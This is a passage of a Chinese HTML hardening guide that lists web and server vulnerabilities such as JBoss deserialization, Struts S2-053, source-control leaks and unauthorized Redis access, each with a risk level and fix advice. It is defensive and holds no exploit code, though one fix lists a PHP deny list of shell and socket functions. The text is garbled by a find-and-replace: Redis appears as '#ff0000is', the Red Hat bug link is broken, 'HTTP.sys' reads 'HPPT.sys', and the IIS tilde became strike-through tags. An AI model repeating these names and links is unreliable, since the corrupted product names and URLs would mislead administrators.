Seam参数化EL表达式远程代码执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>JBoss Seam是一个Java EE5框架，把JSF与EJB3.0组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。<br>JBoss Seam处理某些参数化JBoss EL表达式的方式存在输入过滤漏洞（ CVE-2010-1871）。如果远程攻击者能够诱骗通过认证的JBoss Seam用户访问特制的网页，就可能导致执行任意代码<br><strong>加固建议：</strong><br>升级至4.3.0 EL4或以上更高的、确认已修复此漏洞的版本。参考链接：<a href="https://bugzilla./#ff0000hat.com/show_bug.cgi?id=615956">https://bugzilla.#ff0000hat.com/show_bug.cgi?id=615956</a></p><h2 id="Weblogic-Java反序列化远程命令执行漏洞"><a href="#Weblogic-Java反序列化远程命令执行漏洞" class="headerlink" title="Weblogic Java反序列化远程命令执行漏洞"></a>Weblogic Java反序列化远程命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Weblogic存在Java反序列化漏洞，攻击者可以远程执行系统命令，获得服务器权限。<br><strong>加固建议：</strong><br>及时升级官方补丁。</p><h2 id="JBoss反序列化漏洞"><a href="#JBoss反序列化漏洞" class="headerlink" title="JBoss反序列化漏洞"></a>JBoss反序列化漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法,并且该方法在相关对象反序列化时并未进行任何校验，导致远程代码执行。利用漏洞，允许攻击者远程执行系统命令，获得服务器权限，导致服务器运行安全风险。<br><strong>加固建议：</strong><br>1.针对JBoss Java反序列化漏洞，建议更新jboss版本到最新版（<a href="http://www.jboss.org/%EF%BC%89%E6%88%96">http://www.jboss.org/）或</a> 更新官方补丁。<br>2.针对数据库帐号密码进行修改，要求密码长度8位数以上，密码复杂程度必须包含数字、大小写字母及特殊字符。<br>3.对服务器进行全面安全检查，及时排查、清除webshell等后门文件；及时修改数据库密码等。</p><h2 id="JBoss-JMXInvokerServlet远程命令执行漏洞"><a href="#JBoss-JMXInvokerServlet远程命令执行漏洞" class="headerlink" title="JBoss JMXInvokerServlet远程命令执行漏洞"></a>JBoss JMXInvokerServlet远程命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Jboss在默认安装的时候，会安装http-invoker.sar站点，当请求invoker/JMXInvokerServlet或invoker/EJBInvokerServlet会调用org.jboss.invocation.http.servlet.InvokerServlet.class处理请求。该类对GET请求和POST请求，统一调用processRequest函数处理，因此，攻击者需要自己构造一个jboss的类，并且将其序列化，然后将序列化的数据直接提交到存在漏洞站点的invoker/JMXInvokerServlet页面，恶意代码将会被执行。<br><strong>加固建议：</strong><br>建议删除或禁止访问/invoker/JMXInvokerServlet文件。</p><h2 id="Apache-ActiveMQ远程代码执行漏洞-CVE-2016-3088"><a href="#Apache-ActiveMQ远程代码执行漏洞-CVE-2016-3088" class="headerlink" title="Apache ActiveMQ远程代码执行漏洞 (CVE-2016-3088)"></a>Apache ActiveMQ远程代码执行漏洞 (CVE-2016-3088)</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。<br><strong>加固建议：</strong><br>1.ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。<br>2.通过移除 conf\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能</p><h2 id="Apache-Tomcat示例目录漏洞"><a href="#Apache-Tomcat示例目录漏洞" class="headerlink" title="Apache Tomcat示例目录漏洞"></a>Apache Tomcat示例目录漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>tomcat安装时默认的演示、文档页面，会造成信息泄露和XSS跨站脚本漏洞，攻击者可以创建、销毁或控制session。<br><strong>加固建议：</strong><br>删除相关功能演示页面。</p><h2 id="Tomcat版本过低漏洞"><a href="#Tomcat版本过低漏洞" class="headerlink" title="Tomcat版本过低漏洞"></a>Tomcat版本过低漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Tomcat由于版本过低存在安全漏洞。<br><strong>加固建议：</strong><br>升级Tomcat版本或及时打补丁。</p><h2 id="S2-053命令执行漏洞"><a href="#S2-053命令执行漏洞" class="headerlink" title="S2-053命令执行漏洞"></a>S2-053命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Apache Struts2 Freemarker标签如果被错误的配置使用，将会导致RCE远程代码执行漏洞。<br><strong>加固建议：</strong><br>1.升级到Apache Struts版本2.5.12或2.3.34<br>2.使用只读属性来初始化value属性（仅限getter属性）<br>3.Freemarker标签内容不要通过Request方式获取 </p><h2 id="HPPT-sys远程代码执行漏洞（MS15-034）"><a href="#HPPT-sys远程代码执行漏洞（MS15-034）" class="headerlink" title="HPPT.sys远程代码执行漏洞（MS15-034）"></a>HPPT.sys远程代码执行漏洞（MS15-034）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。<br>影响以下版本操作系统的IIS服务器：Windows 7、Windows 8、Windows server 2008、Windows server 2012<br><strong>加固建议：</strong><br>用户安装微软官方修复补丁（3042553）。<br><a href="https://support.microsoft.com/zh-cn/kb/3042553">https://support.microsoft.com/zh-cn/kb/3042553</a></p><h2 id="WebDav文件上传-信息泄露漏洞"><a href="#WebDav文件上传-信息泄露漏洞" class="headerlink" title="WebDav文件上传/信息泄露漏洞"></a>WebDav文件上传/信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server文件进行读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。远程攻击者可能利用此漏洞非授权读写文件。<br><strong>加固建议：</strong><br>通常情况下网站不需要支持额外的方法，建议禁用WebDav服务，关闭PUT、MOVE、COPY等方法。</p><h2 id="slowhttp拒绝服务攻击"><a href="#slowhttp拒绝服务攻击" class="headerlink" title="slowhttp拒绝服务攻击"></a>slowhttp拒绝服务攻击</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>如果远程攻击者使用发包工具向Apache服务器发送了不完整的HTTP请 求，服务器会打开连接等待接受完整的头，但如果发包工具不再继续发送完整请求而是发送无效头的话，就会一直保持打开的连接。这种攻击所造成的影响很严重， 因为攻击者不需要发送很大的通讯就可以耗尽服务器上的可用连接。也就是说，即使低带宽的用户也可以攻击大流量的服务器。<br><strong>加固建议：</strong><br>1.升级到最新版的apache<br>2.在httpd.conf中添加RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500<br>3.直接在 iptables 中限制每个 IP 的连接数可以解决以上绝大部分问题，除非攻击者拥有众多肉鸡，否则单 IP 的攻击将失去效果。<br>iptables -A INPUT -p tcp –syn –dport 8889 -m connlimit –connlimit-above 20 -j REJECT –reject-with tcp-reset</p><h2 id="jQuery版本过低（jQuery低版本存在跨站）"><a href="#jQuery版本过低（jQuery低版本存在跨站）" class="headerlink" title="jQuery版本过低（jQuery低版本存在跨站）"></a>jQuery版本过低（jQuery低版本存在跨站）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>jQuery 1.6.3之前版本中存在跨站脚本漏洞。当使用location.hash选择元素时，通过特制的标签，远程攻击者利用该漏洞注入任意web脚本或HTML。<br><strong>加固建议：</strong><br>升级jQuery版本。</p><h2 id="不安全的javascript库文件"><a href="#不安全的javascript库文件" class="headerlink" title="不安全的javascript库文件"></a>不安全的javascript库文件</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>该版本的javascript库存在多个安全漏洞<br><strong>加固建议：</strong><br>升级javascript库版本。</p><h2 id="传输层保护不足漏洞"><a href="#传输层保护不足漏洞" class="headerlink" title="传输层保护不足漏洞"></a>传输层保护不足漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>传输层保护不足，会暴露传输的数据，导致数据被窃听，账号被盗等，如果是管理员的账号面临这个问题，那么将会导致整个网站处于数据暴露的状态，将对网站和用户造成严重的甚至无法挽回的损失。<br><strong>加固建议：</strong><br>1.对所有敏感的页面使用SSL，非SSL请求的页面应该被重定向到SSL请求的页面。<br>2.对所有敏感的Cookie，设置“secure”的flag。<br>3.保证SSL的提供商只支持强大的算法，这样就不能够被轻易破解。（使用标准的强算法）<br>4.确保您的证书是有效的，不过期，不被撤销，并匹配这个网站使用的所有域。<br>5.后台和其他的连接也应该使用SSL或其他加密技术。<br>6.即使是开发者的注释也应该很好的被保护，防止信息泄露。</p><h2 id="服务器启用了TRACE-Method方法"><a href="#服务器启用了TRACE-Method方法" class="headerlink" title="服务器启用了TRACE Method方法"></a>服务器启用了TRACE Method方法</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong></p><ol><li>恶意攻击者可以通过TRACE Method返回的信息了解到网站前端的一些信息，如缓存服务器等，从而为下一步的攻击提供便利。</li><li>恶意攻击者可以通过TRACE Method进行XSS攻击</li><li>即使网站对关键页面启用了HttpOnly头标记和禁止脚本读取cookie信息，那么通过TRACE Method恶意攻击者还是可以绕过这个限制读取到cookie信息。</li></ol><p>  <strong>加固建议：</strong><br>  禁用TRACE方法。</p><h2 id="点击劫持漏洞（X-Frame-Options头缺失）"><a href="#点击劫持漏洞（X-Frame-Options头缺失）" class="headerlink" title="点击劫持漏洞（X-Frame-Options头缺失）"></a>点击劫持漏洞（X-Frame-Options头缺失）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>通过覆盖不可见的框架误导受害者点击，受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。<br><strong>加固建议：</strong><br>设置X-Frame-Options值来防御利用iframe嵌套的点击劫持攻击。</p><h2 id="启用了不安全的HTTP方法（启用了OPTIONS方法）"><a href="#启用了不安全的HTTP方法（启用了OPTIONS方法）" class="headerlink" title="启用了不安全的HTTP方法（启用了OPTIONS方法）"></a>启用了不安全的HTTP方法（启用了OPTIONS方法）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>开启了不安全的HTTP方法：DELTE/SEARCE/COPY，MOVE/PROPFIND/PROPPATCH/MKCOL/LOCK/UNLOCK/PUT，可能会在Web 服务器上上载、修改或删除Web 页面、脚本和文件。<br><strong>加固建议：</strong><br>如果服务器不需要支持WebDAV，请务必禁用它，或禁止不必要的HTTP 方法。</p><h2 id="域名访问限制不严格"><a href="#域名访问限制不严格" class="headerlink" title="域名访问限制不严格"></a>域名访问限制不严格</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>目标存在域名访问限制不严格漏洞。Http请求的Hostname字段没有严格的域名限制，导致可以绕过一些防护措施。<br><strong>加固建议：</strong><br>配置WEB服务器，限制只能以域名形式访问服务器。</p><h2 id="SVN源代码泄露"><a href="#SVN源代码泄露" class="headerlink" title="SVN源代码泄露"></a>SVN源代码泄露</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>造成SVN源代码漏洞的主要原因是管理员操作不规范。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。<br>更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。<br><strong>加固建议：</strong><br>针对SVN信息泄露漏洞，建议删除WEB目录里的SVN文件或限制访问.svn目录，并升级SVN软件至1.7或以上更高版本</p><h2 id="idea工程目录信息泄露漏洞"><a href="#idea工程目录信息泄露漏洞" class="headerlink" title=".idea工程目录信息泄露漏洞"></a>.idea工程目录信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>.idea目录用来放置开发工程的一些配置文件，通常是.xml文件。其中workspace.xml里面存放一些开发者个人配置，比如开发路径、开发环境等。里面包含一些敏感信息。<br><strong>加固建议：</strong><br>生产环境中删除.idea目录及该目录下的文件，或配置网站服务器禁止访问.idea目录。</p><h2 id="ASP-NET-Padding-Oracle信息泄露-MS10-070"><a href="#ASP-NET-Padding-Oracle信息泄露-MS10-070" class="headerlink" title="ASP.NET_Padding_Oracle信息泄露(MS10-070)"></a>ASP.NET_Padding_Oracle信息泄露(MS10-070)</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br> ASP.NET由于加密填充验证过程中处理错误不当，导致存在一个信息泄漏漏洞。成功利用此漏洞的攻击者可以读取服务器加密的数据，例如视图状态。 此漏洞还可以用于数据篡改，如果成功利用，可用于解密和篡改服务器加密的数据。<br><strong>加固建议：</strong><br>建议将Microsoft .NET Framework 更新至最新版本。</p><h2 id="git信息泄露"><a href="#git信息泄露" class="headerlink" title=".git信息泄露"></a>.git信息泄露</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>泄露网站敏感信息，攻击者可直接获取源码信息实施进一步攻击。<br><strong>加固建议：</strong><br>删除.git目录。</p><h2 id="错误页面信息泄露（应用程序错误信息）"><a href="#错误页面信息泄露（应用程序错误信息）" class="headerlink" title="错误页面信息泄露（应用程序错误信息）"></a>错误页面信息泄露（应用程序错误信息）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者可以根据错误或警告消息收集服务器信息。<br><strong>加固建议：</strong><br>1.关闭web服务器错误提示；<br>2.关闭运行平台的错误提示；<br>3.建立错误机制，不要把真实的错误反馈给访问者。捕获后台抛出的异常，制定异常固定跳转页面，如500错误，跳转到相应页面，例如“系统异常请与管理员联系”，403异常，找不到页面等等。</p><h2 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。<br><strong>加固建议：</strong><br>1.删除不必要的备份文件；<br>2.设置访问权限；<br>3.将备份文件放至服务器其它目录下。</p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者通过不指定url中的具体文件，来查看某个目录下的所有文件和目录结构。<br><strong>加固建议：</strong><br>针对目录遍历漏洞，建议通过修改配置文件，去除Web 容器（如Apache）的文件目录索引功能。</p><h2 id="IIS短文件名漏洞"><a href="#IIS短文件名漏洞" class="headerlink" title="IIS短文件名漏洞"></a>IIS短文件名漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Microsoft IIS在实现上存在文件枚举漏洞，攻击者可以利用“<del>”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。<br><strong>加固建议：</strong><br>针对IIS短文件名漏洞，建议禁止url中使用“</del>”或它的Unicode编码，或关闭windows的8.3格式功能。</p><h2 id="源代码泄露漏洞"><a href="#源代码泄露漏洞" class="headerlink" title="源代码泄露漏洞"></a>源代码泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>部分或全部页面源代码泄露，攻击者可审查源代码泄露的可用信息进一步渗透。<br><strong>加固建议：</strong><br>删除源代码文件或对需要的未解析的源代码进行解析。</p><h2 id="robots-txt文件泄露"><a href="#robots-txt文件泄露" class="headerlink" title="robots.txt文件泄露"></a>robots.txt文件泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>泄露网站敏感信息，包括网站的后台页面或其它隐私页面。<br><strong>加固建议：</strong><br>1.robots.txt 文件不应用来保护或隐藏信息。<br>2.应该将敏感的文件和目录移到另一个隔离的子目录，以便将这个目录排除在 Web Robot 搜索之外。如下列示例所示，将文件移到“folder”之类的非特定目录名称是比较好的解决方案： New directory structure: /folder/passwords.txt /folder/sensitive_folder/<br>New robots.txt: User-agent: * Disallow: /folder/<br>3.如果您无法更改目录结构，且必须将特定目录排除于 Web Robot 之外，在 robots.txt 文件中，请只用局部名称。虽然这不是最好的解决方案，但至少它能加大完整目录名称的猜测难度。例如，如果要排除“sensitive_folder”和 “passwords.txt”，请使用下列名称（假设 Web 根目录中没有起始于相同字符的文件或目录）： robots.txt: User-agent: * Disallow: /se Disallow: /pa。</p><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>敏感信息泄露一般包括：中间件、软件框架（cms）类型和版本信息，数据库表结构、网站架构、账号密码体系等等。这些信息一般在服务器错误信息、html注释、隐藏表单、示例文件等地方出现。攻击者得到这些信息，有助于缩小攻击范围，进行有针对性的更深层次的攻击。<br><strong>加固建议：</strong><br>对于一般信息泄露，删除无用页面，或删除页面中的敏感信息即可。对于敏感报错信息泄露，需要设置代码捕获异常，并抛出异常，服务端出现异常后不在客户端回显，统一返回不包含敏感信息的错误页面。</p><h2 id="Github信息泄露漏洞"><a href="#Github信息泄露漏洞" class="headerlink" title="Github信息泄露漏洞"></a>Github信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>开发人员使用Github进行代码管理。而免费用户在Github上的项目内容可在网站中检索到，并对所有用户开放可查看。泄露的敏感信息一般包括：软件源代码、程序账号密码等等。攻击者得到这些信息，可以进行代码审计，更有针对性的找到网站漏洞，甚至可以获得用户账号密码，直接登录获得用户权限。<br><strong>加固建议：</strong><br>删除敏感的Github项目代码，对可能泄露的帐号密码及时进行修改。</p><h2 id="PHP探针信息泄露"><a href="#PHP探针信息泄露" class="headerlink" title="PHP探针信息泄露"></a>PHP探针信息泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>PHP探针文件会导致网站敏感信息泄露<br><strong>加固建议：</strong><br>删除默认安装PHP探针文件。</p><h2 id="phpinfo页面泄露"><a href="#phpinfo页面泄露" class="headerlink" title="phpinfo页面泄露"></a>phpinfo页面泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>泄露网站服务器敏感信息，包括网站物理路径、PHP版本、服务器信息及环境变量等。<br><strong>加固建议：</strong><br>1.通过修改服务器环境内php.ini文件，将“expose_php = On”修改成“expose_php = Off”然后重启php即可。<br>2.如果确实需要该测试信息，在测试时使用，测试完毕后将该文件删除掉。<br>3.若无需要可以将一些php的危险函数禁用，打开/etc/php.ini文件，查找到 disable_functions，添加需禁用的以下函数名：phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen</p><h2 id="发现隐藏目录"><a href="#发现隐藏目录" class="headerlink" title="发现隐藏目录"></a>发现隐藏目录</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>尝试了检测服务器上的隐藏目录，403 Forbidden 响应泄露了存在此目录，即使不允许对其进行访问，泄露网站目录结构。<br><strong>加固建议：</strong><br>可对禁止的资源发布“404 - Not Found”响应状态代码，或者将其完全除去。</p><h2 id="内部IP地址泄露"><a href="#内部IP地址泄露" class="headerlink" title="内部IP地址泄露"></a>内部IP地址泄露</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>泄露内网IP地址<br><strong>加固建议：</strong><br>禁止将内网IP置于网站页面或代码层中。</p><h2 id="OpenSSH-CBC模式信息泄露漏洞"><a href="#OpenSSH-CBC模式信息泄露漏洞" class="headerlink" title="OpenSSH CBC模式信息泄露漏洞"></a>OpenSSH CBC模式信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>配置为CBC模式，OpenSSH没有正确地处理分组密码算法加密的SSH会话中所出现的错误，导致可能泄露密文中任意块最多32位纯文本。<br><strong>加固建议：</strong><br>临时解决方案：在SSH会话中仅使用CTR模式加密算法，如AES-CTR<br>目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<br><a href="https://downloads.ssh.com/">https://downloads.ssh.com/</a></p><h2 id="未加密的登录请求"><a href="#未加密的登录请求" class="headerlink" title="未加密的登录请求"></a>未加密的登录请求</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>检测中发现登录请求（例如：用户名、密码、电子邮件地址、社会安全号码等）被发送到服务器的过程中并未采用通讯加密协议或加密。恶意人员可通过数据截包实现网站管理员用户名、密码信息的截获。<br><strong>加固建议：</strong><br>注册或登录时，客户发送请求敏感信息进行加密，例如密码、电话、邮件等敏感信息进行加密传输。</p><h2 id="Memcached-未授权访问漏洞"><a href="#Memcached-未授权访问漏洞" class="headerlink" title="Memcached 未授权访问漏洞"></a>Memcached 未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>由于memcached安全设计缺陷，客户端连接memcached服务器后无需认证就可读取、修改服务器缓存内容。<br><strong>加固建议：</strong><br>1.配置memcached监听本地回环地址127.0.0.1。<br>2.当memcached配置为监听内网IP或公网IP时，使用主机防火墙（iptalbes、firewalld等）和网络防火墙对memcached服务端口进行过滤。</p><h2 id="rsync未授权访问漏洞"><a href="#rsync未授权访问漏洞" class="headerlink" title="rsync未授权访问漏洞"></a>rsync未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>rsync是类unix系统下的数据镜像备份工具，如果配置不当，可导致攻击者匿名访问rsync程序，进一步进行增删改等操作。<br><strong>加固建议：</strong><br>建议两种方式防御，一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。</p><h2 id="WebSphere绕过安全限制漏洞"><a href="#WebSphere绕过安全限制漏洞" class="headerlink" title="WebSphere绕过安全限制漏洞"></a>WebSphere绕过安全限制漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在Java端”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII低字符”.”。通过这个方法可以绕过目录保护读取包配置文件信息，包括web-inf和meta-inf目录下的内容。攻击者还可以利用此漏洞查看或执行war包里面的文件。此漏洞影响WebSphere Application Server 版本5.1, 6.0, 6.1 和7.0。<br><strong>加固建议：</strong><br>升级WebSphere至最新版，或安装PK81387安全补丁。<br><a href="http://www-01.ibm.com/support/docview.wss?uid=swg24022456">http://www-01.ibm.com/support/docview.wss?uid=swg24022456</a></p><h2 id="cisco-vpn未授权访问"><a href="#cisco-vpn未授权访问" class="headerlink" title="cisco vpn未授权访问"></a>cisco vpn未授权访问</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Cisco Adaptive Security Appliance (ASA) Software在Clientless SSL VPN入口自定义框架在实现上存在安全漏洞，未经身份验证的远程攻击者可利用此漏洞修改Clientless SSL VPN入口内容，导致窃取凭证、跨站脚本及其他攻击。此漏洞源于没有正确实现Clientless SSL VPN入口自定义框架内的身份验证检查。<br><strong>加固建议：</strong><br>建议升级思科最新发布的补丁：<br><a href="http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa">http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa</a></p><h2 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>DNS区域传送（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新自己的域（zone）数据库，一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息。<br><strong>加固建议：</strong><br>针对域传送漏洞，建议通过定义ACL(访问控制列表)来限制在域名服务器之间的区域传送，通常可编辑/etc/named.conf中allow-transfer参数。存在漏洞的是ns1.com, 如果其他ns2、ns3、ns4是备用dns服务器，那么应该只允许域传送至其他对应的地址。配置如下：<br>allow-transfer { localhost; ns2的IP; ns3的IP; ns4的IP;};</p><h2 id="Mongodb数据库未授权访问漏洞"><a href="#Mongodb数据库未授权访问漏洞" class="headerlink" title="Mongodb数据库未授权访问漏洞"></a>Mongodb数据库未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Mongodb在启动的时候未设置 –auth参数，造成恶意攻击者可使用默认空口令登陆到数据服务器。<br><strong>加固建议：</strong><br>建议增加数据库用户校验或限制设备登录IP地址，限制未授权访问。</p><h2 id="ff0000is数据库未授权访问漏洞"><a href="#ff0000is数据库未授权访问漏洞" class="headerlink" title="#ff0000is数据库未授权访问漏洞"></a>#ff0000is数据库未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>#ff0000is 默认情况下会绑定在 0.0.0.0:6379，这样将会将 #ff0000is 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 #ff0000is 以及读取 #ff0000is 的数据。攻击者在未授权访问 #ff0000is 的情况下可以利用 #ff0000is的相关方法，可以成功在 #ff0000is 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。<br><strong>加固建议：</strong><br>1.配置bind选项，限定可以连接#ff0000is服务器的IP，修改 #ff0000is 的默认端口6379<br>2.配置认证，也就是AUTH，设置密码，密码会以明文方式保存在#ff0000is配置文件中<br>3.配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度<br>4.好消息是#ff0000is作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config等。</p><h2 id="phpmyadmin未授权访问"><a href="#phpmyadmin未授权访问" class="headerlink" title="phpmyadmin未授权访问"></a>phpmyadmin未授权访问</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>发现phpmyadmin路径，且没有密码保护，可直接登录数据库，获得数据库root权限。<br><strong>加固建议：</strong><br>设置数据库密码防止未授权访问，修改phpmyadmin默认路径防止被攻击者发现。</p><h2 id="htaccess文件未授权访问"><a href="#htaccess文件未授权访问" class="headerlink" title=".htaccess文件未授权访问"></a>.htaccess文件未授权访问</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者可未授权访问.htaccess文件，泄露网站敏感信息。<br><strong>加固建议：</strong><br>禁止.htaccess文件被查看</p><h2 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>包括但不限于：网站登录/FTP/SSH/数据库/中间件等，攻击者可猜解用户登录口令登录系统，实施进一步渗透攻击。<br><strong>加固建议：</strong><br>针对弱口令漏洞，建议用户及时修改密码，加强口令强度，设置口令为8位以上大小写字母、数字、特殊符号组合，并定期更换密码，避免使用弱口令。</p><h2 id="SNMP默认团体名漏洞"><a href="#SNMP默认团体名漏洞" class="headerlink" title="SNMP默认团体名漏洞"></a>SNMP默认团体名漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  